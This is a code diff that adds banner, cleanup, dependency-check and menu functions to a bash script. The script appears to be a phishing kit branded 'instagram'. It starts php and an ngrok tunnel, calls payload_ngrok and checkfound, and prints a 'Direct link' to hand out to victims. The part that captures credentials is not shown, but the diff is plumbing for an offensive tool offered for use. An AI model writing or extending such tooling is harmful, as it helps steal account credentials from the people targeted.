@@ -4,6 +4,42 @@
 
 trap 'printf "\n";stop' 2
 
+banner() {
+
+printf " \e[1;77m v1.1.1 coded by github.com/thelinuxproject/instagram\e[0m \n"
+
+printf "\n"
+
+
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+dependencies() {
+
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+ 
+
+}
 checkfound() {
 
 printf "\n"
@@ -86,3 +122,28 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 payload_ngrok
 checkfound
 }
+
+start1() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+
+if [[ $option_server -eq 1 ]]; then
+ngrok_server
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+start1
+fi
+
+}
+banner
+dependencies
+start1
